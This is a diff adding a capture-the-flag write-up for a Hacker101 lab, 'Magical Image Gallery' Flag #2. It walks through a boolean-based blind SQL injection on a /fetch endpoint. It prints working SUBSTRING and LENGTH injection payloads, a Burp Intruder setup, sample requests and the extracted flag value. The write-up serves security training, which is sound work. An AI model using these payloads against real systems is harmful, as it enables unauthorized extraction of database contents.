@@ -1,0 +1,74 @@
+================================
+LAB: Magical Image Gallery - Flag #2
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 6, 2026
+Lab URL: https://618a0a757b7277affb45517a31c06a98.ctf.hacker101.com/
+Category: Web Security - Blind SQL Injection
+Level: Moderate
+Objective: Extract hidden flag from database via boolean-based blind SQLi
+Description: Extract flag stored as filename in photos table using character-by-character extraction
+
+[RECONNAISSANCE]
+----------------
+During initial enumeration, id=3 consistently returned 500 ISE despite being referenced in UI as "Invisible" with 0 space used.
+
+Testing revealed:
+- /fetch?id=1 → 200 (valid image)
+- /fetch?id=2 → 200 (valid image)  
+- /fetch?id=3 → 500 (file read error)
+
+Hypothesis: id=3 filename contains non-existent file path or flag stored directly in DB.
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+From source code analysis (Flag #1), identified that /fetch endpoint executes:
+SELECT filename FROM photos WHERE id={input}
+
+Application attempts to read filename value as file path. When filename doesn't exist as file, returns 500.
+
+Tested filename length for id=3:
+Payload: /fetch?id=1 AND LENGTH((SELECT filename FROM photos WHERE id=3))>10
+
+Binary search (dichotomy) revealed length = 64 characters, matching Flag #1 format.
+
+Conclusion: Flag #2 stored directly in photos.filename WHERE id=3, not as file path.
+
+[EXPLOITATION]
+--------------
+Extraction method: Boolean-based blind SQLi with character-by-character enumeration
+
+Base payload:
+/fetch?id=1 AND SUBSTRING((SELECT filename FROM photos WHERE id=3),1,1)='a'
+
+200 response = correct character
+404 response = incorrect character
+
+Burp Intruder configuration:
+- Attack type: Cluster Bomb
+- Payload Set 1 (position): Numbers 1-64
+- Payload Set 2 (character): Simple list 0-9,a-f (hex charset)
+- Total requests: 64 × 16 = 1,024
+
+Optimization: Hex-only charset (16 chars) instead of alphanumeric (36 chars) reduced request count by ~60%.
+
+Execution time: ~2-3 minutes with throttling
+
+[EVIDENCE]
+----------
+Sample requests:
+GET /fetch?id=1+AND+SUBSTRING((SELECT+filename+FROM+photos+WHERE+id=3),1,1)='3' → 200
+GET /fetch?id=1+AND+SUBSTRING((SELECT+filename+FROM+photos+WHERE+id=3),2,1)='6' → 200
+GET /fetch?id=1+AND+SUBSTRING((SELECT+filename+FROM+photos+WHERE+id=3),3,1)='5' → 200
+
+Flag extracted: 365f6e649ed4e2484fc9136319c0038608f755f19c9c84a257c3eefe161ad0cf
+
+[LESSONS LEARNED]
+-----------------
+1. 500 errors may indicate valid data causing application logic failures, not just invalid input
+2. Blind SQLi remains effective when direct extraction blocked by application logic
+3. Binary search for length discovery significantly reduces enumeration time
+4. Charset optimization (hex vs alphanumeric) improves efficiency for hash extraction
+5. Cluster Bomb attack parallelizes character extraction across all positions simultaneously
